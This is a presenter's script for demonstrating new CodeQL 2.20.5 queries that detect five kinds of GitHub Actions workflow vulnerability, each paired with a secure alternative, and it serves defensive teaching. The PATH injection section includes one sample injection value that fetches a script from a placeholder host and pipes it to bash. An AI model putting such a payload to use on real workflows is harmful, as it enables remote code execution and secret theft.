# CodeQL 2.20.5 GitHub Actions Workflow Security Demo

## Demo Setup Instructions

1. Create a new public GitHub repository
2. Add the vulnerable workflow files from the "Vulnerable GitHub Actions Workflow Examples" to your repository
3. Enable GitHub Advanced Security and set up CodeQL scanning
4. Set up the updated CodeQL 2.20.5 version (if you are using Advanced setup)
5. Run a scan against your repository

## Demo Script

### Introduction (2 minutes)

"Today we're demonstrating the new analysis capabilities for GitHub Actions workflows introduced in CodeQL 2.20.5. This update includes five new security queries specifically designed to detect common security risks in GitHub Actions workflows."

### Vulnerability 1: PATH Injection (3 minutes)

**Show the vulnerable workflow:** `path-injection.yml`

"This workflow takes user input from an issue title and adds it directly to the PATH environment variable. This is problematic because:"

- An attacker could add a path like `/tmp;curl -s malicious.com/payload | bash;`
- This would execute arbitrary commands during workflow execution
- This could lead to secret exposure or repository compromise

**Show the CodeQL alert** that identifies this vulnerability

**Show the secure alternative:** `secure-path.yml`

### Vulnerability 2: Environment Variable Injection (3 minutes)

**Show the vulnerable workflow:** `envvar-injection.yml`

"This workflow puts user input directly into environment variables without sanitization. This allows attackers to:"

- Inject newlines to set additional environment variables
- Use GitHub's expression syntax with `{{{ }}}` to access secrets
- Influence subsequent steps in unexpected ways

**Show the CodeQL alert** that identifies this vulnerability

**Show the secure alternative:** `secure-envvar.yml`

### Vulnerability 3: Code Injection (3 minutes)

**Show the vulnerable workflow:** `code-injection.yml`

"This workflow is particularly dangerous as it directly executes user-provided content:"

- An attacker could include shell commands in the issue body
- These commands execute with the permissions of the workflow
- This could expose repository secrets or compromise dependencies

**Show the CodeQL alert** that identifies this vulnerability

**Show the secure alternative:** `secure-code-execution.yml`

### Vulnerability 4: Artifact Poisoning (3 minutes)

**Show the vulnerable workflow:** `artifact-poisoning.yml`

"This workflow downloads and executes artifacts without proper verification:"

- Attackers could potentially supply malicious artifacts
- The workflow executes these without validation
- This creates a supply chain vulnerability

**Show the CodeQL alert** that identifies this vulnerability

**Show the secure alternative:** `secure-artifact.yml`

### Vulnerability 5: Untrusted Checkout (3 minutes)

**Show the vulnerable workflow:** `untrusted-checkout.yml`

"This workflow uses `pull_request_target` (which has access to secrets) but checks out code from a PR:"

- `pull_request_target` runs with repository permissions and access to secrets
- Checking out PR code means untrusted code runs with these elevated permissions
- A malicious PR could extract secrets or modify repository settings

**Show the CodeQL alert** that identifies this vulnerability

**Show the secure alternative:** `secure-pr-handling.yml`

### Demo: Before/After Comparison (3 minutes)

"Let's compare the results we get from an older version of CodeQL with what 2.20.5 detects:"

- Show a comparison between old and new scan results
- Highlight that these vulnerabilities would have been missed previously

### Q&A (5 minutes)

"I hope this demo has helped illustrate the new security capabilities in CodeQL 2.20.5 for GitHub Actions workflows. Let's open it up for questions."

## Key Takeaways

1. GitHub Actions workflows can introduce serious security vulnerabilities if not properly secured
2. The new CodeQL queries help identify five common patterns that could lead to security breaches
3. Most vulnerabilities stem from improper handling of user-controlled input
4. Following security best practices for GitHub Actions significantly reduces risks
5. Regularly scanning with the latest CodeQL version helps detect these issues early
